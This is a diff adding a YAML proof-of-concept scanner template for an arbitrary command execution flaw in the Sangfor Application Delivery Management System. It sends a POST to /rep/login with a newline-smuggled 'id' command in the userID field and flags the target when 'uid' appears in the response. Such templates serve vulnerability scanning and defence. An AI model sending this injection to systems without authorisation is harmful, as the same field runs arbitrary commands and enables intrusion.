@@ -1,0 +1,12 @@
+name: poc-yaml-深信服-应用交付管理系统-cmd
+description: "任意命令执行"
+method: POST
+body: "userID=admin%0Aid%0A&userPsw=123&page=login&log_type=report&index=index&clsMode=cls_mode_login&rnd=0.9709373567217479"
+headers:
+  Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
+path:
+  - /rep/login
+expression:
+  status: 200
+  body_all:
+    - "uid"
